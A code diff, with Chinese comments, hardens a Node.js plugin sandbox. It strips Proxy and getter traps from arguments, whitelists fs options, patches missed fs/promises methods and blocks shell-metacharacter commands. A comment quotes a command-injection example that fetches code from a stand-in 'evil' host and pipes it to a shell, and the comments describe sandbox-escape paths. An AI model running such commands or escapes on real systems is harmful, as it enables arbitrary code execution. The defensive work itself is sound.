@@ -37,6 +37,9 @@ const KNOWN_GAPS = Object.freeze([
   '未声明且非敏感的环境变量读取（只有敏感命名或已声明前缀才进守卫链）',
   '卸载（dispose）之后仍在事件队列里的定时器/回调：Bridge 已还原原生模块，这些调用不再经过守卫链',
   '已授权的 worker_threads / 子进程内部：独立 realm 或独立进程，本进程的 Hook 对其不可见',
+  'fs options 白名单（FS_OPTIONS）之外的键会被丢弃：Node 新版本给 fs 方法新增 options 键而白名单未同步时，该键静默失效（丢功能不丢安全），升级 Node 后需要对照核补',
+  'options 里的回调与实现对象按引用保留（cp 的 filter、createReadStream 的自定义 fs 等）：回调在原生重入窗口内执行，其内部的越权调用会被直通——宿主不得让插件传入自带逻辑的回调',
+  'options 的深层嵌套值（第二层及以下的对象/存取器）按引用保留：白名单只做第一层提取，深层的 getter 仍可能在原生窗口内执行',
 ]);
 
 function safeDefine(target, prop, value, descriptor) {
@@ -72,6 +75,142 @@ function firstCommand(args) {
 }
 
 /**
+ * 刻意按引用保留的原生类型：语义依赖内部槽位（Buffer 的字节数据、URL 的
+ * 解析状态、AbortSignal 的信号状态），拷贝即破坏。这是设计而非疏漏。
+ */
+function isNativeObject(value) {
+  return Buffer.isBuffer(value)
+    || ArrayBuffer.isView(value)
+    || value instanceof URL
+    || (typeof AbortSignal === 'function' && value instanceof AbortSignal)
+    || value instanceof Date
+    || value instanceof RegExp;
+}
+
+/**
+ * 纯数据浅拷：逐自有可枚举键 defineProperty。
+ * 不用 Object.assign：源对象带自有可枚举 `__proto__` 数据属性时，assign 的
+ * [[Set]] 会命中 Object.prototype 的 `__proto__` setter，把副本原型换成
+ * 攻击者对象——原生随后读副本属性就在直通窗口里执行攻击者的 getter
+ * （H1 证据 B 实证路径）。defineProperty 走 [[DefineOwnProperty]]：`__proto__`
+ * 只会成为副本的自有数据属性，原型链不受影响。getter 的值读取发生在拷贝
+ * 当下（callDepth === 0），副作用照常走守卫链。
+ */
+function plainCopy(source) {
+  // 副本用 null 原型：原生读副本属性时完全不触原型链，连 Object.prototype
+  // 上的存取器/方法面（__proto__ getter、hasOwnProperty 等）也不给窗口。
+  const copy = Object.setPrototypeOf({}, null);
+  for (const key of Object.keys(source)) {
+    Object.defineProperty(copy, key, {
+      value: source[key],
+      writable: true,
+      enumerable: true,
+      configurable: true,
+    });
+  }
+  return copy;
+}
+
+/**
+ * fs/fsp 的 options 白名单：每个方法原生实现实际读取的键。
+ * options 交给原生前提取成纯对象：类实例/继承对象的 getter 在提取的 [[Get]]
+ * 中触发——此刻 callDepth === 0，越权副作用撞守卫链并被记账（H1 证据 A）；
+ * 副本本身只有数据，原生重入窗口里不再有插件代码可执行。
+ * 白名单是刻意的保守面：Node 新增 options 键而这里没跟上时该键被丢弃
+ * （丢功能不丢安全），残余面见 KNOWN_GAPS。
+ */
+const FS_OPTIONS = {
+  readFile: { index: 1, keys: ['encoding', 'flag', 'signal'] },
+  readFileSync: { index: 1, keys: ['encoding', 'flag', 'signal'] },
+  createReadStream: { index: 1, keys: ['encoding', 'fd', 'flags', 'mode', 'autoClose', 'emitClose', 'start', 'end', 'highWaterMark', 'fs'] },
+  createWriteStream: { index: 1, keys: ['encoding', 'fd', 'flags', 'mode', 'autoClose', 'emitClose', 'start', 'highWaterMark', 'fs'] },
+  readdir: { index: 1, keys: ['encoding', 'withFileTypes', 'recursive'] },
+  readdirSync: { index: 1, keys: ['encoding', 'withFileTypes', 'recursive'] },
+  stat: { index: 1, keys: ['bigint', 'throwIfNoEntry'] },
+  statSync: { index: 1, keys: ['bigint', 'throwIfNoEntry'] },
+  lstat: { index: 1, keys: ['bigint', 'throwIfNoEntry'] },
+  lstatSync: { index: 1, keys: ['bigint', 'throwIfNoEntry'] },
+  statfs: { index: 1, keys: ['bigint'] },
+  statfsSync: { index: 1, keys: ['bigint'] },
+  readlink: { index: 1, keys: ['encoding'] },
+  readlinkSync: { index: 1, keys: ['encoding'] },
+  watchFile: { index: 1, keys: ['persistent', 'interval', 'bigint'] },
+  openAsBlob: { index: 1, keys: ['type'] },
+  writeFile: { index: 2, keys: ['encoding', 'mode', 'flag', 'flush', 'signal'] },
+  writeFileSync: { index: 2, keys: ['encoding', 'mode', 'flag', 'flush', 'signal'] },
+  appendFile: { index: 2, keys: ['encoding', 'mode', 'flag', 'signal'] },
+  appendFileSync: { index: 2, keys: ['encoding', 'mode', 'flag', 'signal'] },
+  mkdir: { index: 1, keys: ['recursive', 'mode'] },
+  mkdirSync: { index: 1, keys: ['recursive', 'mode'] },
+  rm: { index: 1, keys: ['force', 'maxRetries', 'recursive', 'retryDelay', 'signal'] },
+  rmSync: { index: 1, keys: ['force', 'maxRetries', 'recursive', 'retryDelay', 'signal'] },
+  rmdir: { index: 1, keys: ['maxRetries', 'recursive', 'retryDelay'] },
+  rmdirSync: { index: 1, keys: ['maxRetries', 'recursive', 'retryDelay'] },
+  opendir: { index: 1, keys: ['encoding', 'bufferSize', 'recursive'] },
+  opendirSync: { index: 1, keys: ['encoding', 'bufferSize', 'recursive'] },
+  realpath: { index: 1, keys: ['encoding'] },
+  realpathSync: { index: 1, keys: ['encoding'] },
+  mkdtemp: { index: 1, keys: ['encoding'] },
+  mkdtempSync: { index: 1, keys: ['encoding'] },
+  cp: { index: 2, keys: ['mode', 'force', 'errorOnExist', 'dereference', 'verbatimSymlinks', 'filter', 'recursive', 'signal'] },
+  cpSync: { index: 2, keys: ['mode', 'force', 'errorOnExist', 'dereference', 'verbatimSymlinks', 'filter', 'recursive', 'signal'] },
+};
+
+/**
+ * options 白名单提取：参数确为对象（排除回调函数与数组）且不是刻意保留的
+ * 原生类型时才进行。提取值里的函数（如 cp 的 filter）按引用保留，
+ * 其残余风险见 KNOWN_GAPS。
+ */
+function extractOptionsArg(args, spec) {
+  if (!spec) return args;
+  const candidate = args[spec.index];
+  if (!candidate || typeof candidate !== 'object' || Array.isArray(candidate)) return args;
+  if (isNativeObject(candidate)) return args;
+  const extracted = {};
+  for (const key of spec.keys) {
+    // [[Get]] 走原型链：类实例/继承对象的 getter 在此触发（callDepth === 0）。
+    const value = candidate[key];
+    // 只回填有值的键：Node 22 起部分原生实现（如 fs.cp）对「键存在但值为
+    // undefined」做严格类型校验（ERR_INVALID_ARG_TYPE），缺省键必须保持缺省。
+    if (value !== undefined) extracted[key] = value;
+  }
+  const next = args.slice();
+  next[spec.index] = extracted;
+  return next;
+}
+
+/**
+ * 剥离参数里的 Proxy 陷阱与存取器（F1：options-Proxy 逃逸；H1：类实例与
+ * `__proto__` 自有属性逃逸）。
+ * 原生 fs/net 会在 invokeOriginal 的重入窗口里**同步**读取 options 对象的属性；
+ * 插件若把 Proxy、带 getter 的对象或类实例当参数传入，陷阱代码就在窗口内执行，
+ * 它再发起的调用会被 guardedEntry 当作原生重入直通放行（已实证可越权写文件）。
+ * 所以在开窗之前把对象参数浅拷成纯数据：getter 与 Proxy 陷阱的副作用在拷贝
+ * 当下触发——此刻 callDepth 仍为 0，副作用照常走守卫链；副本交给原生后，
+ * 原生读到的只是数据，不再触发任何插件代码。
+ * fs 系方法的 options 参数另有更精确的白名单提取（extractOptionsArg），
+ * 这里是其余入口的兜底层。Buffer/TypedArray/URL/AbortSignal 等原生类型
+ * 按引用保留：语义依赖内部槽位，拷贝即破坏。
+ */
+function stripArgTraps(args) {
+  let copy = null;
+  for (let index = 0; index < args.length; index += 1) {
+    const arg = args[index];
+    if (arg === null || typeof arg !== 'object') continue;
+    if (isNativeObject(arg)) continue;
+    if (!copy) copy = args.slice();
+    // 拷贝读取自有可枚举属性：getter 与 Proxy 陷阱在此刻（callDepth === 0）
+    // 触发，其副作用仍受守卫链约束。
+    try {
+      copy[index] = Array.isArray(arg) ? Array.prototype.slice.call(arg) : plainCopy(arg);
+    } catch {
+      copy[index] = arg; // 无法拷贝（如已吊销的 Proxy）：原样交给原生，由原生抛它自己的类型错误。
+    }
+  }
+  return copy || args;
+}
+
+/**
  * Bridge：把 fs/net/proc/env/凭证访问收敛到守卫链。
  * 只包装 Node 内置模块的公开入口；所有包装器都保留原始函数引用，
  * 以便卸载与完整性检测。
@@ -103,9 +242,11 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
     if (typeof original !== 'function') { unpatched.push({ prop, reason: 'not_function' }); return false; }
     // 交给 maker 的是「带重入窗口的原生调用」，判定代码因此始终在 callDepth === 0 下执行。
     const invokeOriginal = function invokeOriginal(...callArgs) {
+      // 先剥离陷阱再开窗：顺序不能反，否则剥离本身就发生在直通窗口里了。
+      const safeArgs = stripArgTraps(callArgs);
       callDepth += 1;
       try {
-        return original.apply(this, callArgs);
+        return original.apply(this, safeArgs);
       } finally {
         callDepth -= 1;
       }
@@ -359,11 +500,14 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
     });
   }
 
-  function wrapFsMethod(action, { paths = [0], promises = false } = {}) {
+  function wrapFsMethod(action, { paths = [0], promises = false, method = null } = {}) {
     return (original) => function wrappedFs(...args) {
       for (const index of paths) guardPath(action, args[index]);
-      if (promises) return original.apply(this, args);
-      return original.apply(this, args);
+      // H1：options 交给原生前做白名单提取，类实例/继承 getter 在提取时
+      // （callDepth === 0）被守卫拦截并记账，原生重入窗口里只剩纯数据。
+      const callArgs = extractOptionsArg(args, method ? FS_OPTIONS[method] : null);
+      if (promises) return original.apply(this, callArgs);
+      return original.apply(this, callArgs);
     };
   }
 
@@ -371,9 +515,9 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
     const readMethods = ['readFile', 'readFileSync', 'createReadStream', 'readdir', 'readdirSync', 'stat', 'statSync', 'lstat', 'lstatSync', 'access', 'accessSync', 'existsSync', 'readlink', 'readlinkSync', 'statfs', 'statfsSync', 'watchFile', 'unwatchFile', 'openAsBlob'];
     const writeMethods = ['writeFile', 'writeFileSync', 'appendFile', 'appendFileSync', 'mkdir', 'mkdirSync', 'createWriteStream'];
     const deleteMethods = ['unlink', 'unlinkSync', 'rm', 'rmSync', 'rmdir', 'rmdirSync'];
-    for (const method of readMethods) patchMethod(fs, method, wrapFsMethod('read'));
-    for (const method of writeMethods) patchMethod(fs, method, wrapFsMethod('write'));
-    for (const method of deleteMethods) patchMethod(fs, method, wrapFsMethod('delete'));
+    for (const method of readMethods) patchMethod(fs, method, wrapFsMethod('read', { method }));
+    for (const method of writeMethods) patchMethod(fs, method, wrapFsMethod('write', { method }));
+    for (const method of deleteMethods) patchMethod(fs, method, wrapFsMethod('delete', { method }));
 
     // 句柄获取点才是关口：open/opendir 一旦放行，后续 fd 级操作无法再定性。
     patchMethod(fs, 'open', (original) => function wrappedOpen(pathValue, flags, ...rest) {
@@ -403,15 +547,15 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
     patchMethod(fs, 'openSync', (original) => function wrappedOpenSync(...args) {
       return guardOpenSync(original, args);
     }, 'fs.openSync');
-    patchMethod(fs, 'opendir', wrapFsMethod('read'), 'fs.opendir');
-    patchMethod(fs, 'opendirSync', wrapFsMethod('read'), 'fs.opendirSync');
-    patchMethod(fs, 'realpath', wrapFsMethod('read'), 'fs.realpath');
-    patchMethod(fs, 'realpathSync', wrapFsMethod('read'), 'fs.realpathSync');
+    patchMethod(fs, 'opendir', wrapFsMethod('read', { method: 'opendir' }), 'fs.opendir');
+    patchMethod(fs, 'opendirSync', wrapFsMethod('read', { method: 'opendirSync' }), 'fs.opendirSync');
+    patchMethod(fs, 'realpath', wrapFsMethod('read', { method: 'realpath' }), 'fs.realpath');
+    patchMethod(fs, 'realpathSync', wrapFsMethod('read', { method: 'realpathSync' }), 'fs.realpathSync');
     for (const method of ['truncate', 'truncateSync', 'chmod', 'chmodSync', 'chown', 'chownSync', 'utimes', 'utimesSync', 'lchown', 'lchownSync', 'lutimes', 'lutimesSync']) {
-      patchMethod(fs, method, wrapFsMethod('write'), `fs.${method}`);
+      patchMethod(fs, method, wrapFsMethod('write', { method }), `fs.${method}`);
     }
     for (const method of ['mkdtemp', 'mkdtempSync']) {
-      patchMethod(fs, method, wrapFsMethod('write'), `fs.${method}`);
+      patchMethod(fs, method, wrapFsMethod('write', { method }), `fs.${method}`);
     }
     for (const method of ['symlink', 'symlinkSync']) {
       // 符号链接：args[0] 只是目标字符串（可以悬空），真正落盘的是 args[1]。
@@ -446,12 +590,12 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
     patchMethod(fs, 'cp', (original) => function wrappedCp(...args) {
       guardPath('read', args[0]);
       guardPath('write', args[1]);
-      return original.apply(this, args);
+      return original.apply(this, extractOptionsArg(args, FS_OPTIONS.cp));
     });
     patchMethod(fs, 'cpSync', (original) => function wrappedCpSync(...args) {
       guardPath('read', args[0]);
       guardPath('write', args[1]);
-      return original.apply(this, args);
+      return original.apply(this, extractOptionsArg(args, FS_OPTIONS.cpSync));
     });
     patchMethod(fs, 'rename', (original) => function wrappedRename(...args) {
       guardPath('read', args[0]);
@@ -465,22 +609,29 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
     });
 
     if (fsp) {
-      patchMethod(fsp, 'readFile', wrapFsMethod('read'));
-      patchMethod(fsp, 'readdir', wrapFsMethod('read'));
-      patchMethod(fsp, 'stat', wrapFsMethod('read'));
-      patchMethod(fsp, 'lstat', wrapFsMethod('read'));
-      patchMethod(fsp, 'access', wrapFsMethod('read'));
-      patchMethod(fsp, 'writeFile', wrapFsMethod('write'));
-      patchMethod(fsp, 'appendFile', wrapFsMethod('write'));
-      patchMethod(fsp, 'mkdir', wrapFsMethod('write'));
-      patchMethod(fsp, 'unlink', wrapFsMethod('delete'));
-      patchMethod(fsp, 'rm', wrapFsMethod('delete'));
-      patchMethod(fsp, 'rmdir', wrapFsMethod('delete'));
+      patchMethod(fsp, 'readFile', wrapFsMethod('read', { promises: true, method: 'readFile' }));
+      patchMethod(fsp, 'readdir', wrapFsMethod('read', { promises: true, method: 'readdir' }));
+      patchMethod(fsp, 'stat', wrapFsMethod('read', { promises: true, method: 'stat' }));
+      patchMethod(fsp, 'lstat', wrapFsMethod('read', { promises: true, method: 'lstat' }));
+      patchMethod(fsp, 'access', wrapFsMethod('read', { promises: true, method: 'access' }));
+      patchMethod(fsp, 'writeFile', wrapFsMethod('write', { promises: true, method: 'writeFile' }));
+      patchMethod(fsp, 'appendFile', wrapFsMethod('write', { promises: true, method: 'appendFile' }));
+      patchMethod(fsp, 'mkdir', wrapFsMethod('write', { promises: true, method: 'mkdir' }));
+      patchMethod(fsp, 'unlink', wrapFsMethod('delete', { promises: true, method: 'unlink' }));
+      patchMethod(fsp, 'rm', wrapFsMethod('delete', { promises: true, method: 'rm' }));
+      patchMethod(fsp, 'rmdir', wrapFsMethod('delete', { promises: true, method: 'rmdir' }));
       patchMethod(fsp, 'copyFile', (original) => function wrappedCopyFile(...args) {
         guardPath('read', args[0]);
         guardPath('write', args[1]);
         return original.apply(this, args);
       });
+      // H4：fs.cp/cpSync 早已受控，fsp.cp 一直漏在补丁表外——
+      // 授权模型里「树拷贝」是读写双面越界，不能只堵同步入口。
+      patchMethod(fsp, 'cp', (original) => function wrappedCp(...args) {
+        guardPath('read', args[0]);
+        guardPath('write', args[1]);
+        return original.apply(this, extractOptionsArg(args, FS_OPTIONS.cp));
+      }, 'fsp.cp');
       patchMethod(fsp, 'rename', (original) => function wrappedRename(...args) {
         guardPath('read', args[0]);
         guardPath('write', args[1]);
@@ -498,10 +649,16 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
         }
         return handle;
       }, 'fsp.open');
-      patchMethod(fsp, 'opendir', wrapFsMethod('read'), 'fsp.opendir');
-      patchMethod(fsp, 'realpath', wrapFsMethod('read'), 'fsp.realpath');
+      patchMethod(fsp, 'opendir', wrapFsMethod('read', { promises: true, method: 'opendir' }), 'fsp.opendir');
+      patchMethod(fsp, 'realpath', wrapFsMethod('read', { promises: true, method: 'realpath' }), 'fsp.realpath');
+      // H4 覆盖表核补：fs 侧早已受控而 fsp 侧漏网的四个方法。
+      patchMethod(fsp, 'readlink', wrapFsMethod('read', { promises: true, method: 'readlink' }), 'fsp.readlink');
+      patchMethod(fsp, 'statfs', wrapFsMethod('read', { promises: true, method: 'statfs' }), 'fsp.statfs');
       for (const method of ['truncate', 'chmod', 'chown', 'utimes', 'mkdtemp']) {
-        patchMethod(fsp, method, wrapFsMethod('write'), `fsp.${method}`);
+        patchMethod(fsp, method, wrapFsMethod('write', { promises: true, method }), `fsp.${method}`);
+      }
+      for (const method of ['lchown', 'lutimes']) {
+        patchMethod(fsp, method, wrapFsMethod('write', { promises: true, method }), `fsp.${method}`);
       }
       patchMethod(fsp, 'symlink', (original) => function wrappedSymlink(...args) {
         guardPath('write', args[1]);
@@ -637,10 +794,65 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
     }
   }
 
+  /** shell 元字符：; | & $ ` > < 换行等——出现即代表命令会被 shell 重新解释。 */
+  const SHELL_METACHARS = /[;|&$`<>\n\r]/;
+
+  /**
+   * H3：exec/execSync（以及 shell:true 的 spawn 系）把整串命令交给 shell 解释，
+   * 而判定只看得到首词——`git;curl evil|sh` 会以 git 的名义跑任意程序。
+   * 含元字符的命令直接拒绝（先按 deny 记账再抛错），错误信息引导 execFile。
+   */
+  function denyShellMetachar(rawCommand) {
+    const command = String(rawCommand || '');
+    if (!SHELL_METACHARS.test(command)) return false;
+    if (ledger && typeof ledger.append === 'function') {
+      try {
+        ledger.append({
+          plugin: pluginInfo.id,
+          pluginVersion: pluginInfo.version,
+          capability: 'proc.spawn',
+          action: 'spawn',
+          scope: { command: command.slice(0, 200) },
+          decision: 'deny',
+          ruleId: 'shell_metachar',
+          reason: 'shell 元字符使首词判定失效，请改用 execFile 逐参数传递',
+          intercepted: true,
+        });
+      } catch {
+        // 记账失败不改变拒绝结论。
+      }
+    }
+    throw new CovenantDenied(
+      '拒绝含 shell 元字符（; | & $ ` > < 换行等）的命令：首词判定无法覆盖 shell 的重新解释，请改用 execFile 逐参数传递',
+      { capability: 'proc.spawn', scope: { command: command.slice(0, 200) }, ruleId: 'shell_metachar' },
+    );
+  }
+
   function installProc() {
     const spawnLike = ['spawn', 'spawnSync', 'execFile', 'execFileSync', 'fork'];
     for (const method of spawnLike) {
       patchMethod(childProcess, method, (original) => function wrappedSpawn(...args) {
+        // options 里的 shell / execPath 会改变实际执行的程序或解释器：
+        //  - shell:true → 命令经 shell 重新解释，首词判定失效（与 exec 同型注入面）；
+        //  - 自定义 shell 字符串 → 实际执行的是未经判定的解释器，直接拒绝；
+        //  - fork 的 execPath → 判定的是 modulePath，实际跑的却是 execPath 指定的程序。
+        const options = args.find((arg, index) => index > 0
+          && arg && typeof arg === 'object' && !Array.isArray(arg));
+        if (options) {
+          if (typeof options.shell === 'string') {
+            throw new CovenantDenied(
+              `spawn 系入口不接受自定义 shell（${options.shell}）：该解释器未经 proc.spawn 判定`,
+              { capability: 'proc.spawn', scope: { command: String(args[0]).slice(0, 200) }, ruleId: 'shell_custom' },
+            );
+          }
+          if (options.shell === true) denyShellMetachar(args[0]);
+          if (method === 'fork' && typeof options.execPath === 'string' && options.execPath !== process.execPath) {
+            throw new CovenantDenied(
+              `fork 的 execPath（${options.execPath}）不是当前 Node：判定的 modulePath 与实际执行的程序错位`,
+              { capability: 'proc.spawn', scope: { command: options.execPath }, ruleId: 'fork_execpath' },
+            );
+          }
+        }
         const command = firstCommand(args);
         guard.enforce('proc.spawn', { command });
         return original.apply(this, args);
@@ -648,6 +860,7 @@ function createBridge({ guard, ledger, plugin = null, autoSweep = false, globBat
     }
     for (const method of ['exec', 'execSync']) {
       patchMethod(childProcess, method, (original) => function wrappedExec(...args) {
+        denyShellMetachar(args[0]);
         const command = firstCommand(args);
         guard.enforce('proc.spawn', { command });
         return original.apply(this, args);
